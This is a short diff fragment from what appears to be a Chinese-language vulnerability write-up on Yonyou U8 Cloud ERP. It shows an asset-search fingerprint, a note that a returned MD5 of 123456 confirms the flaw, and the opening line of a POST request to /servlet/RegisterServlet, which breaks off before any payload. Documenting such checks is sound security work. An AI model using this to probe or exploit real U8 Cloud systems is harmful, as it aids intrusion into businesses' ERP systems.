@@ -10,7 +10,7 @@ U8 cloud不同于传统的ERP，融合了交易、服务、管理于一体的整
 app="用友-U8-Cloud"
 ```
 
-## poc
+## POC
 发送下面的poc，响应包返回123456 的md5为存在漏洞
 ```
 POST /servlet/RegisterServlet HTTP/1.1
